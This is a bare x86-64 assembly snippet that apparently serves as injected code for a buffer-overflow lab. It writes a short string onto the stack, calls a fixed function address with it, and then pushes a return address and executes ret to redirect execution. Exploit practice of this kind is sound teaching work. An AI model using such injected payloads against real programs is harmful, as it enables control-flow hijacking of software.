sub $0x300, %rsp
movabs $0x706E6172676B6A5E, %rax
movb $0x00, 8(%rsp)
mov %rax, (%rsp)
mov %rsp, %rdi
movabs $0x40094f, %rax
call *%rax
add $0x300, %rsp
push $0x400a75
ret
